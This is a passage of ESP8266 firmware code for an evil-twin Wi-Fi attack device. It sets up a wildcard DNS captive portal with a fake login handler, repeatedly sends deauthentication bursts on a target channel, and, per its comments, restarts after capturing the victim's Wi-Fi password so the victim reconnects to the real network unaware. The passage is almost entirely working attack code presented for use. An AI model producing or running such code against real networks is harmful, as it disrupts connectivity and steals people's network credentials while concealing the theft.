    dnsServer.start(DNS_PORT, "*", apIP);

    server.on("/",      HTTP_GET,  onAttackRoot);
    server.on("/login", HTTP_POST, onAttackLogin);
    server.onNotFound(onNotFound);
    server.begin();

    attacking = true;
    Serial.println("Deauth + captive portal active.");
}

/* ================================================================== */
void setup(void)
{
    Serial.begin(115200);
    delay(500);
    checkFactoryReset();
    loadSetupConfig();
    loadConfig();
    loadPwd();
    if (isConfigured()) enterAttackMode();
    else               enterConfigMode();
}

void loop(void)
{
    dnsServer.processNextRequest();
    server.handleClient();

    if (attacking) {
        unsigned long now = millis();
        if (now - lastDeauthMs >= 200) {
            lastDeauthMs = now;
            wifi_set_channel(targetChannel);
            sendDeauthBurst();
        }
    }

    /* After capturing password, wait 10 s then restart.
       The fake AP goes down → victim phone reconnects to real WiFi. */
    if (capturedFlag && millis() - capturedMs >= 10000) {
        Serial.println("Password captured – shutting down fake AP, restarting...");
        clearConfig();         /* go back to config mode on next boot */
        delay(200);
        ESP.restart();
    }
}